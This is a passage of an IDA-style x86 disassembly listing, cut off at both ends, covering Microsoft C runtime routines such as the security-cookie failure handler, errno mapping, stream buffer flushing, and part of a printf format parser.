; ---------------------------------------------------------------------------

loc_4105FC:                             ; CODE XREF: sub_4105E3+4D↓j
                cmp     esi, 0FFFFFFFFh
                jnz     short loc_410606
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_410606:                             ; CODE XREF: sub_4105E3+1C↑j
                mov     ecx, [ebp+var_4]
                dec     esi
                mov     eax, esi
                imul    eax, 14h
                add     eax, ecx
                mov     ecx, [ebp+arg_8]
                cmp     [eax+4], ecx
                jge     short loc_41061E
                cmp     ecx, [eax+8]
                jle     short loc_410623

loc_41061E:                             ; CODE XREF: sub_4105E3+34↑j
                cmp     esi, 0FFFFFFFFh
                jnz     short loc_41062C

loc_410623:                             ; CODE XREF: sub_4105E3+39↑j
                dec     [ebp+arg_4]
                mov     ebx, [ebp+arg_0]

loc_410629:                             ; CODE XREF: sub_4105E3+17↑j
                mov     [ebp+arg_0], esi

loc_41062C:                             ; CODE XREF: sub_4105E3+3E↑j
                cmp     [ebp+arg_4], 0
                jge     short loc_4105FC
                mov     eax, [ebp+arg_C]
                inc     esi
                mov     [eax], esi
                mov     eax, [ebp+arg_10]
                mov     [eax], ebx
                cmp     ebx, [edi+0Ch]
                ja      short loc_410646
                cmp     esi, ebx
                jbe     short loc_41064B

loc_410646:                             ; CODE XREF: sub_4105E3+5D↑j
                call    sub_41888F
; ---------------------------------------------------------------------------

loc_41064B:                             ; CODE XREF: sub_4105E3+61↑j
                mov     eax, esi
                imul    eax, 14h
                add     eax, [ebp+var_4]
                pop     edi
                pop     esi
                pop     ebx
                leave
                retn
sub_4105E3      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410658      proc near               ; CODE XREF: sub_417EEA+28↓p

arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_4]
                push    esi
                mov     esi, [ebp+arg_0]
                mov     [esi], eax
                call    sub_412405
                mov     eax, [eax+98h]
                mov     [esi+4], eax
                call    sub_412405
                mov     [eax+98h], esi
                mov     eax, esi
                pop     esi
                pop     ebp
                retn
sub_410658      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410684      proc near               ; CODE XREF: sub_417EEA+186↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                call    sub_412405
                mov     eax, [eax+98h]
                jmp     short loc_4106A0
; ---------------------------------------------------------------------------

loc_410696:                             ; CODE XREF: sub_410684+1E↓j
                mov     ecx, [eax]
                cmp     ecx, [ebp+arg_0]
                jz      short loc_4106A7
                mov     eax, [eax+4]

loc_4106A0:                             ; CODE XREF: sub_410684+10↑j
                test    eax, eax
                jnz     short loc_410696
                inc     eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_4106A7:                             ; CODE XREF: sub_410684+17↑j
                xor     eax, eax
                pop     ebp
                retn
sub_410684      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4106AB      proc near               ; CODE XREF: sub_417EEA+12F↓p

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                call    sub_412405
                mov     esi, [ebp+arg_0]
                cmp     esi, [eax+98h]
                jnz     short loc_4106D2
                call    sub_412405
                mov     ecx, [esi+4]
                mov     [eax+98h], ecx

loc_4106CF:                             ; CODE XREF: sub_4106AB+50↓j
                pop     esi
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_4106D2:                             ; CODE XREF: sub_4106AB+14↑j
                call    sub_412405
                mov     eax, [eax+98h]
                jmp     short loc_4106E8
; ---------------------------------------------------------------------------

loc_4106DF:                             ; CODE XREF: sub_4106AB+41↓j
                mov     ecx, [eax+4]
                cmp     esi, ecx
                jz      short loc_4106F5
                mov     eax, ecx

loc_4106E8:                             ; CODE XREF: sub_4106AB+32↑j
                cmp     dword ptr [eax+4], 0
                jnz     short loc_4106DF
                pop     esi
                pop     ebp
                jmp     sub_41888F
; ---------------------------------------------------------------------------

loc_4106F5:                             ; CODE XREF: sub_4106AB+39↑j
                mov     ecx, [esi+4]
                mov     [eax+4], ecx
                jmp     short loc_4106CF
sub_4106AB      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4106FD      proc near               ; CODE XREF: sub_417EEA+7F↓p

var_18          = dword ptr -18h
var_14          = dword ptr -14h
var_10          = dword ptr -10h
var_C           = dword ptr -0Ch
var_8           = dword ptr -8
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h
arg_10          = dword ptr  18h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 18h
                mov     eax, ___security_cookie
                and     [ebp+var_18], 0
                lea     ecx, [ebp+var_18]
                xor     eax, ecx
                mov     ecx, [ebp+arg_0]
                mov     [ebp+var_10], eax
                mov     eax, [ebp+arg_4]
                mov     [ebp+var_C], eax
                mov     eax, [ebp+arg_C]
                inc     eax
                mov     [ebp+var_14], offset sub_41043A
                mov     [ebp+var_8], ecx
                mov     [ebp+var_4], eax
                mov     eax, large fs:0
                mov     [ebp+var_18], eax
                lea     eax, [ebp+var_18]
                mov     large fs:0, eax
                push    [ebp+arg_10]
                push    ecx
                push    [ebp+arg_8]
                call    sub_4188E0
                mov     ecx, eax
                mov     eax, [ebp+var_18]
                mov     large fs:0, eax
                mov     eax, ecx
                leave
                retn
sub_4106FD      endp

; [00000033 BYTES: COLLAPSED FUNCTION __EH_prolog3. PRESS CTRL-NUMPAD+ TO EXPAND]
; [00000036 BYTES: COLLAPSED FUNCTION __EH_prolog3_catch. PRESS CTRL-NUMPAD+ TO EXPAND]

; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4107C6      proc near               ; CODE XREF: __security_check_cookie(x):loc_40E31A↑j

var_328         = dword ptr -328h
var_324         = dword ptr -324h
var_320         = dword ptr -320h
var_s0          = dword ptr  0
arg_0           = byte ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 328h
                mov     dword_42ABE8, eax
                mov     dword_42ABE4, ecx
                mov     dword_42ABE0, edx
                mov     dword_42ABDC, ebx
                mov     dword_42ABD8, esi
                mov     dword_42ABD4, edi
                mov     word_42AC00, ss
                mov     word_42ABF4, cs
                mov     word_42ABD0, ds
                mov     word_42ABCC, es
                mov     word_42ABC8, fs
                mov     word_42ABC4, gs
                pushf
                pop     dword_42ABF8
                mov     eax, [ebp+var_s0]
                mov     dword_42ABEC, eax
                mov     eax, [ebp+4]
                mov     dword_42ABF0, eax
                lea     eax, [ebp+arg_0]
                mov     dword_42ABFC, eax
                mov     eax, [ebp+var_320]
                mov     dword_42AB38, 10001h
                mov     eax, dword_42ABF0
                mov     dword_42AAEC, eax
                mov     dword_42AAE0, 0C0000409h
                mov     dword_42AAE4, 1
                mov     eax, ___security_cookie
                mov     [ebp+var_328], eax
                mov     eax, dword_425044
                mov     [ebp+var_324], eax
                call    ds:IsDebuggerPresent
                mov     dword_42AB30, eax
                push    1
                call    sub_41350D
                pop     ecx
                push    0               ; lpTopLevelExceptionFilter
                call    ds:SetUnhandledExceptionFilter
                push    offset ExceptionInfo ; ExceptionInfo
                call    ds:UnhandledExceptionFilter
                cmp     dword_42AB30, 0
                jnz     short loc_4108B8
                push    1
                call    sub_41350D
                pop     ecx

loc_4108B8:                             ; CODE XREF: sub_4107C6+E8↑j
                push    0C0000409h      ; uExitCode
                call    ds:GetCurrentProcess
                push    eax             ; hProcess
                call    ds:TerminateProcess
                leave
                retn
sub_4107C6      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_4108CC      proc near               ; CODE XREF: sub_40FD55+80↑p
                                        ; sub_40FEFC+182↑p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                mov     eax, [ebp+arg_0]
                xor     ecx, ecx

loc_4108D6:                             ; CODE XREF: sub_4108CC+17↓j
                cmp     eax, dword_425048[ecx*8]
                jz      short loc_4108F2
                inc     ecx
                cmp     ecx, 2Dh
                jb      short loc_4108D6
                lea     ecx, [eax-13h]
                cmp     ecx, 11h
                ja      short loc_4108FB
                push    0Dh
                pop     eax
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_4108F2:                             ; CODE XREF: sub_4108CC+11↑j
                mov     eax, dword_42504C[ecx*8]
                pop     ebp
                retn
; ---------------------------------------------------------------------------

loc_4108FB:                             ; CODE XREF: sub_4108CC+1F↑j
                add     eax, 0FFFFFF44h
                push    0Eh
                pop     ecx
                cmp     ecx, eax
                sbb     eax, eax
                and     eax, ecx
                add     eax, 8
                pop     ebp
                retn
sub_4108CC      endp


; =============== S U B R O U T I N E =======================================


sub_41090E      proc near               ; CODE XREF: sub_40E31F:loc_40E334↑p
                                        ; sub_40E31F+3A↑p ...
                call    sub_41238C
                test    eax, eax
                jnz     short loc_41091D
                mov     eax, offset unk_4251B0
                retn
; ---------------------------------------------------------------------------

loc_41091D:                             ; CODE XREF: sub_41090E+7↑j
                add     eax, 8
                retn
sub_41090E      endp


; =============== S U B R O U T I N E =======================================


sub_410921      proc near               ; CODE XREF: sub_410934+6↓p
                                        ; sub_413E86+1C↓p ...
                call    sub_41238C
                test    eax, eax
                jnz     short loc_410930
                mov     eax, offset unk_4251B4
                retn
; ---------------------------------------------------------------------------

loc_410930:                             ; CODE XREF: sub_410921+7↑j
                add     eax, 0Ch
                retn
sub_410921      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410934      proc near               ; CODE XREF: sub_40EA6D+A3↑p
                                        ; sub_413E86+40D↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                call    sub_410921
                mov     ecx, [ebp+arg_0]
                push    ecx
                mov     [eax], ecx
                call    sub_4108CC
                pop     ecx
                mov     esi, eax
                call    sub_41090E
                mov     [eax], esi
                pop     esi
                pop     ebp
                retn
sub_410934      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410957      proc near               ; CODE XREF: sub_40E37C+70↑p
                                        ; sub_40F1E3+116↑p ...

var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    ecx
                push    esi
                mov     esi, [ebp+arg_4]
                push    esi
                call    sub_40F9B4
                mov     [ebp+arg_4], eax
                mov     eax, [esi+0Ch]
                pop     ecx
                test    al, 82h
                jnz     short loc_410989
                call    sub_41090E
                mov     dword ptr [eax], 9

loc_41097D:                             ; CODE XREF: sub_410957+41↓j
                or      dword ptr [esi+0Ch], 20h
                or      eax, 0FFFFFFFFh
                jmp     loc_410AB8
; ---------------------------------------------------------------------------

loc_410989:                             ; CODE XREF: sub_410957+19↑j
                test    al, 40h
                jz      short loc_41099A
                call    sub_41090E
                mov     dword ptr [eax], 22h
                jmp     short loc_41097D
; ---------------------------------------------------------------------------

loc_41099A:                             ; CODE XREF: sub_410957+34↑j
                push    ebx
                xor     ebx, ebx
                test    al, 1
                jz      short loc_4109B7
                mov     [esi+4], ebx
                test    al, 10h
                jz      loc_410A33
                mov     ecx, [esi+8]
                and     eax, 0FFFFFFFEh
                mov     [esi], ecx
                mov     [esi+0Ch], eax

loc_4109B7:                             ; CODE XREF: sub_410957+48↑j
                mov     eax, [esi+0Ch]
                and     eax, 0FFFFFFEFh
                or      eax, 2
                mov     [esi+0Ch], eax
                mov     [esi+4], ebx
                mov     [ebp+var_4], ebx
                test    eax, 10Ch
                jnz     short loc_4109FC
                call    sub_41359A
                add     eax, 20h
                cmp     esi, eax
                jz      short loc_4109E8
                call    sub_41359A
                add     eax, 40h
                cmp     esi, eax
                jnz     short loc_4109F5

loc_4109E8:                             ; CODE XREF: sub_410957+83↑j
                push    [ebp+arg_4]
                call    sub_418B13
                pop     ecx
                test    eax, eax
                jnz     short loc_4109FC

loc_4109F5:                             ; CODE XREF: sub_410957+8F↑j
                push    esi
                call    sub_418ACA
                pop     ecx

loc_4109FC:                             ; CODE XREF: sub_410957+77↑j
                                        ; sub_410957+9C↑j
                test    dword ptr [esi+0Ch], 108h
                push    edi
                jz      loc_410A8A
                mov     eax, [esi+8]
                mov     edi, [esi]
                lea     ecx, [eax+1]
                mov     [esi], ecx
                mov     ecx, [esi+18h]
                sub     edi, eax
                dec     ecx
                cmp     edi, ebx
                mov     [esi+4], ecx
                jle     short loc_410A3E
                push    edi             ; nNumberOfBytesToWrite
                push    eax             ; int
                push    [ebp+arg_4]     ; int
                call    sub_414FE8
                add     esp, 0Ch
                mov     [ebp+var_4], eax
                jmp     short loc_410A80
; ---------------------------------------------------------------------------

loc_410A33:                             ; CODE XREF: sub_410957+4F↑j
                or      eax, 20h
                mov     [esi+0Ch], eax
                or      eax, 0FFFFFFFFh
                jmp     short loc_410AB7
; ---------------------------------------------------------------------------

loc_410A3E:                             ; CODE XREF: sub_410957+C8↑j
                mov     ecx, [ebp+arg_4]
                cmp     ecx, 0FFFFFFFFh
                jz      short loc_410A61
                cmp     ecx, 0FFFFFFFEh
                jz      short loc_410A61
                mov     eax, ecx
                and     eax, 1Fh
                mov     edx, ecx
                sar     edx, 5
                shl     eax, 6
                add     eax, dword_42CA00[edx*4]
                jmp     short loc_410A66
; ---------------------------------------------------------------------------

loc_410A61:                             ; CODE XREF: sub_410957+ED↑j
                                        ; sub_410957+F2↑j
                mov     eax, offset unk_425B80

loc_410A66:                             ; CODE XREF: sub_410957+108↑j
                test    byte ptr [eax+4], 20h
                jz      short loc_410A80
                push    2               ; dwMoveMethod
                push    ebx             ; int
                push    ebx             ; int
                push    ecx             ; int
                call    sub_4189B1
                and     eax, edx
                add     esp, 10h
                cmp     eax, 0FFFFFFFFh
                jz      short loc_410AA5

loc_410A80:                             ; CODE XREF: sub_410957+DA↑j
                                        ; sub_410957+113↑j
                mov     eax, [esi+8]
                mov     cl, byte ptr [ebp+arg_0]
                mov     [eax], cl
                jmp     short loc_410AA0
; ---------------------------------------------------------------------------

loc_410A8A:                             ; CODE XREF: sub_410957+AD↑j
                xor     edi, edi
                inc     edi
                push    edi             ; nNumberOfBytesToWrite
                lea     eax, [ebp+arg_0]
                push    eax             ; int
                push    [ebp+arg_4]     ; int
                call    sub_414FE8
                add     esp, 0Ch
                mov     [ebp+var_4], eax

loc_410AA0:                             ; CODE XREF: sub_410957+131↑j
                cmp     [ebp+var_4], edi
                jz      short loc_410AAE

loc_410AA5:                             ; CODE XREF: sub_410957+127↑j
                or      dword ptr [esi+0Ch], 20h
                or      eax, 0FFFFFFFFh
                jmp     short loc_410AB6
; ---------------------------------------------------------------------------

loc_410AAE:                             ; CODE XREF: sub_410957+14C↑j
                mov     eax, [ebp+arg_0]
                and     eax, 0FFh

loc_410AB6:                             ; CODE XREF: sub_410957+155↑j
                pop     edi

loc_410AB7:                             ; CODE XREF: sub_410957+E5↑j
                pop     ebx

loc_410AB8:                             ; CODE XREF: sub_410957+2D↑j
                pop     esi
                leave
                retn
sub_410957      endp


; =============== S U B R O U T I N E =======================================


sub_410ABB      proc near               ; CODE XREF: sub_410AEE+13↓p
                                        ; sub_410B14+25↓p ...
                test    byte ptr [ecx+0Ch], 40h
                jz      short loc_410AC7
                cmp     dword ptr [ecx+8], 0
                jz      short loc_410AEB

loc_410AC7:                             ; CODE XREF: sub_410ABB+4↑j
                dec     dword ptr [ecx+4]
                js      short loc_410AD7
                mov     edx, [ecx]
                mov     [edx], al
                inc     dword ptr [ecx]
                movzx   eax, al
                jmp     short loc_410AE3
; ---------------------------------------------------------------------------

loc_410AD7:                             ; CODE XREF: sub_410ABB+F↑j
                movsx   eax, al
                push    ecx
                push    eax
                call    sub_410957
                pop     ecx
                pop     ecx

loc_410AE3:                             ; CODE XREF: sub_410ABB+1A↑j
                cmp     eax, 0FFFFFFFFh
                jnz     short loc_410AEB
                or      [esi], eax
                retn
; ---------------------------------------------------------------------------

loc_410AEB:                             ; CODE XREF: sub_410ABB+A↑j
                                        ; sub_410ABB+2B↑j
                inc     dword ptr [esi]
                retn
sub_410ABB      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410AEE      proc near               ; CODE XREF: sub_410B61+A18↓p
                                        ; sub_410B61+A5A↓p ...

arg_0           = byte ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                push    esi
                mov     esi, eax
                jmp     short loc_410B0B
; ---------------------------------------------------------------------------

loc_410AF8:                             ; CODE XREF: sub_410AEE+21↓j
                mov     ecx, [ebp+arg_8]
                mov     al, [ebp+arg_0]
                dec     [ebp+arg_4]
                call    sub_410ABB
                cmp     dword ptr [esi], 0FFFFFFFFh
                jz      short loc_410B11

loc_410B0B:                             ; CODE XREF: sub_410AEE+8↑j
                cmp     [ebp+arg_4], 0
                jg      short loc_410AF8

loc_410B11:                             ; CODE XREF: sub_410AEE+1B↑j
                pop     esi
                pop     ebp
                retn
sub_410AEE      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410B14      proc near               ; CODE XREF: sub_410B61+A38↓p
                                        ; sub_410B61+ABD↓p ...

arg_0           = dword ptr  8

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                test    byte ptr [edi+0Ch], 40h
                push    ebx
                push    esi
                mov     esi, eax
                mov     ebx, ecx
                jz      short loc_410B57
                cmp     dword ptr [edi+8], 0
                jnz     short loc_410B57
                mov     eax, [ebp+arg_0]
                add     [esi], eax
                jmp     short loc_410B5D
; ---------------------------------------------------------------------------

loc_410B32:                             ; CODE XREF: sub_410B14+47↓j
                mov     al, [ebx]
                dec     [ebp+arg_0]
                mov     ecx, edi
                call    sub_410ABB
                inc     ebx
                cmp     dword ptr [esi], 0FFFFFFFFh
                jnz     short loc_410B57
                call    sub_41090E
                cmp     dword ptr [eax], 2Ah
                jnz     short loc_410B5D
                mov     ecx, edi
                mov     al, 3Fh
                call    sub_410ABB

loc_410B57:                             ; CODE XREF: sub_410B14+F↑j
                                        ; sub_410B14+15↑j ...
                cmp     [ebp+arg_0], 0
                jg      short loc_410B32

loc_410B5D:                             ; CODE XREF: sub_410B14+1C↑j
                                        ; sub_410B14+38↑j
                pop     esi
                pop     ebx
                pop     ebp
                retn
sub_410B14      endp


; =============== S U B R O U T I N E =======================================

; Attributes: bp-based frame

sub_410B61      proc near               ; CODE XREF: sub_40E37C+55↑p

var_278         = dword ptr -278h
var_274         = dword ptr -274h
var_270         = dword ptr -270h
var_26C         = dword ptr -26Ch
var_268         = dword ptr -268h
var_260         = dword ptr -260h
var_25C         = byte ptr -25Ch
var_254         = dword ptr -254h
var_250         = byte ptr -250h
var_24C         = dword ptr -24Ch
var_248         = dword ptr -248h
lpMem           = dword ptr -244h
var_240         = dword ptr -240h
var_23C         = dword ptr -23Ch
var_238         = dword ptr -238h
var_234         = dword ptr -234h
var_230         = dword ptr -230h
var_22C         = byte ptr -22Ch
var_22B         = byte ptr -22Bh
var_228         = dword ptr -228h
var_224         = dword ptr -224h
var_220         = dword ptr -220h
var_21C         = dword ptr -21Ch
var_218         = dword ptr -218h
var_211         = byte ptr -211h
var_210         = dword ptr -210h
MultiByteStr    = byte ptr -20Ch
var_D           = byte ptr -0Dh
var_C           = byte ptr -0Ch
var_4           = dword ptr -4
arg_0           = dword ptr  8
arg_4           = dword ptr  0Ch
arg_8           = dword ptr  10h
arg_C           = dword ptr  14h

                mov     edi, edi
                push    ebp
                mov     ebp, esp
                sub     esp, 278h
                mov     eax, ___security_cookie
                xor     eax, ebp
                mov     [ebp+var_4], eax
                push    ebx
                mov     ebx, [ebp+arg_4]
                push    esi
                mov     esi, [ebp+arg_0]
                xor     eax, eax
                push    edi
                mov     edi, [ebp+arg_C]
                push    [ebp+arg_8]
                lea     ecx, [ebp+var_25C]
                mov     [ebp+var_24C], esi
                mov     [ebp+var_224], edi
                mov     [ebp+var_248], eax
                mov     [ebp+var_210], eax
                mov     [ebp+var_234], eax
                mov     [ebp+var_218], eax
                mov     [ebp+var_230], eax
                mov     [ebp+var_240], eax
                mov     [ebp+var_238], eax
                call    sub_40E461
                test    esi, esi
                jnz     short loc_410C01

loc_410BCC:                             ; CODE XREF: sub_410B61+D8↓j
                                        ; sub_410B61+FE↓j ...
                call    sub_41090E
                mov     dword ptr [eax], 16h
                xor     eax, eax
                push    eax
                push    eax
                push    eax
                push    eax
                push    eax
                call    sub_40EC54
                add     esp, 14h
                cmp     [ebp+var_250], 0
                jz      short loc_410BF9
                mov     eax, [ebp+var_254]
                and     dword ptr [eax+70h], 0FFFFFFFDh

loc_410BF9:                             ; CODE XREF: sub_410B61+8C↑j
                or      eax, 0FFFFFFFFh
                jmp     loc_4116C9
; ---------------------------------------------------------------------------

loc_410C01:                             ; CODE XREF: sub_410B61+69↑j
                test    byte ptr [esi+0Ch], 40h
                jnz     short loc_410C65
                push    esi
                call    sub_40F9B4
                pop     ecx
                mov     edx, offset unk_425B80
                cmp     eax, 0FFFFFFFFh
                jz      short loc_410C33
                cmp     eax, 0FFFFFFFEh
                jz      short loc_410C33
                mov     ecx, eax
                and     ecx, 1Fh
                mov     esi, eax
                sar     esi, 5
                shl     ecx, 6
                add     ecx, dword_42CA00[esi*4]
                jmp     short loc_410C35
; ---------------------------------------------------------------------------

loc_410C33:                             ; CODE XREF: sub_410B61+B5↑j
                                        ; sub_410B61+BA↑j
                mov     ecx, edx

loc_410C35:                             ; CODE XREF: sub_410B61+D0↑j
                test    byte ptr [ecx+24h], 7Fh
                jnz     short loc_410BCC
                cmp     eax, 0FFFFFFFFh
                jz      short loc_410C59
                cmp     eax, 0FFFFFFFEh
                jz      short loc_410C59
                mov     ecx, eax
                and     eax, 1Fh
                sar     ecx, 5
                shl     eax, 6
                add     eax, dword_42CA00[ecx*4]
                jmp     short loc_410C5B
; ---------------------------------------------------------------------------

loc_410C59:                             ; CODE XREF: sub_410B61+DD↑j
                                        ; sub_410B61+E2↑j
                mov     eax, edx

loc_410C5B:                             ; CODE XREF: sub_410B61+F6↑j
                test    byte ptr [eax+24h], 80h
                jnz     loc_410BCC

loc_410C65:                             ; CODE XREF: sub_410B61+A4↑j
                xor     ecx, ecx
                cmp     ebx, ecx
                jz      loc_410BCC
                mov     dl, [ebx]
                mov     [ebp+var_228], ecx
                mov     [ebp+var_220], ecx
                mov     [ebp+lpMem], ecx
                mov     [ebp+var_211], dl
                test    dl, dl
                jz      loc_4116B0

loc_410C91:                             ; CODE XREF: sub_410B61+B4A↓j
                inc     ebx
                cmp     [ebp+var_228], 0
                mov     [ebp+var_23C], ebx
                jl      loc_4116B0
                mov     al, dl
                sub     al, 20h
                cmp     al, 58h
                ja      short loc_410CBE
                movsx   eax, dl
                movsx   eax, byte ptr ds:ExceptionInfo.ContextRecord[eax]
                and     eax, 0Fh
                xor     esi, esi
                jmp     short loc_410CC2
; ---------------------------------------------------------------------------

loc_410CBE:                             ; CODE XREF: sub_410B61+14A↑j
                xor     esi, esi
                xor     eax, eax

loc_410CC2:                             ; CODE XREF: sub_410B61+15B↑j
                movsx   eax, ds:byte_420320[ecx+eax*8]
                push    7
                sar     eax, 4
                pop     ecx
                mov     [ebp+var_26C], eax
                cmp     eax, ecx        ; switch 8 cases
                ja      loc_41168B      ; jumptable 00410CDE default case
                jmp     ds:off_4116D9[eax*4] ; switch jump
; ---------------------------------------------------------------------------

loc_410CE5:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
                or      [ebp+var_218], 0FFFFFFFFh ; jumptable 00410CDE case 1
                mov     [ebp+var_270], esi
                mov     [ebp+var_240], esi
                mov     [ebp+var_234], esi
                mov     [ebp+var_230], esi
                mov     [ebp+var_210], esi
                mov     [ebp+var_238], esi
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410D15:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
                movsx   eax, dl         ; jumptable 00410CDE case 2
                sub     eax, 20h
                jz      short loc_410D67
                sub     eax, 3
                jz      short loc_410D58
                sub     eax, 8
                jz      short loc_410D4C
                dec     eax
                dec     eax
                jz      short loc_410D40
                sub     eax, 3
                jnz     loc_41168B      ; jumptable 00410CDE default case
                or      [ebp+var_210], 8
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410D40:                             ; CODE XREF: sub_410B61+1C8↑j
                or      [ebp+var_210], 4
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410D4C:                             ; CODE XREF: sub_410B61+1C4↑j
                or      [ebp+var_210], 1
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410D58:                             ; CODE XREF: sub_410B61+1BF↑j
                or      [ebp+var_210], 80h
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410D67:                             ; CODE XREF: sub_410B61+1BA↑j
                or      [ebp+var_210], 2
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410D73:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
                cmp     dl, 2Ah         ; jumptable 00410CDE case 3
                jnz     short loc_410DA4
                add     edi, 4
                mov     [ebp+var_224], edi
                mov     edi, [edi-4]
                cmp     edi, esi
                mov     [ebp+var_234], edi
                jge     loc_41168B      ; jumptable 00410CDE default case
                or      [ebp+var_210], 4
                neg     [ebp+var_234]
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410DA4:                             ; CODE XREF: sub_410B61+215↑j
                mov     eax, [ebp+var_234]
                imul    eax, 0Ah
                movsx   ecx, dl
                lea     eax, [eax+ecx-30h]
                mov     [ebp+var_234], eax
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410DBF:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
                mov     [ebp+var_218], esi ; jumptable 00410CDE case 4
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410DCA:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
                cmp     dl, 2Ah         ; jumptable 00410CDE case 5
                jnz     short loc_410DF5
                add     edi, 4
                mov     [ebp+var_224], edi
                mov     edi, [edi-4]
                cmp     edi, esi
                mov     [ebp+var_218], edi
                jge     loc_41168B      ; jumptable 00410CDE default case
                or      [ebp+var_218], 0FFFFFFFFh
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410DF5:                             ; CODE XREF: sub_410B61+26C↑j
                mov     eax, [ebp+var_218]
                imul    eax, 0Ah
                movsx   ecx, dl
                lea     eax, [eax+ecx-30h]
                mov     [ebp+var_218], eax
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410E10:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
                cmp     dl, 49h         ; jumptable 00410CDE case 6
                jz      short loc_410E6A
                cmp     dl, 68h
                jz      short loc_410E5E
                cmp     dl, 6Ch
                jz      short loc_410E37
                cmp     dl, 77h
                jnz     loc_41168B      ; jumptable 00410CDE default case
                or      [ebp+var_210], 800h
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410E37:                             ; CODE XREF: sub_410B61+2BC↑j
                cmp     byte ptr [ebx], 6Ch
                jnz     short loc_410E52
                inc     ebx
                or      [ebp+var_210], 1000h
                mov     [ebp+var_23C], ebx
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410E52:                             ; CODE XREF: sub_410B61+2D9↑j
                or      [ebp+var_210], 10h
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410E5E:                             ; CODE XREF: sub_410B61+2B7↑j
                or      [ebp+var_210], 20h
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410E6A:                             ; CODE XREF: sub_410B61+2B2↑j
                mov     al, [ebx]
                cmp     al, 36h
                jnz     short loc_410E8D
                cmp     byte ptr [ebx+1], 34h
                jnz     short loc_410E8D
                inc     ebx
                inc     ebx
                or      [ebp+var_210], 8000h
                mov     [ebp+var_23C], ebx
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410E8D:                             ; CODE XREF: sub_410B61+30D↑j
                                        ; sub_410B61+313↑j
                cmp     al, 33h
                jnz     short loc_410EAE
                cmp     byte ptr [ebx+1], 32h
                jnz     short loc_410EAE
                inc     ebx
                inc     ebx
                and     [ebp+var_210], 0FFFF7FFFh
                mov     [ebp+var_23C], ebx
                jmp     loc_41168B      ; jumptable 00410CDE default case
; ---------------------------------------------------------------------------

loc_410EAE:                             ; CODE XREF: sub_410B61+32E↑j
                                        ; sub_410B61+334↑j
                cmp     al, 64h
                jz      loc_41168B      ; jumptable 00410CDE default case
                cmp     al, 69h
                jz      loc_41168B      ; jumptable 00410CDE default case
                cmp     al, 6Fh
                jz      loc_41168B      ; jumptable 00410CDE default case
                cmp     al, 75h
                jz      loc_41168B      ; jumptable 00410CDE default case
                cmp     al, 78h
                jz      loc_41168B      ; jumptable 00410CDE default case
                cmp     al, 58h
                jz      loc_41168B      ; jumptable 00410CDE default case
                mov     [ebp+var_26C], esi

loc_410EE4:                             ; CODE XREF: sub_410B61+17D↑j
                                        ; DATA XREF: .text:off_4116D9↓o
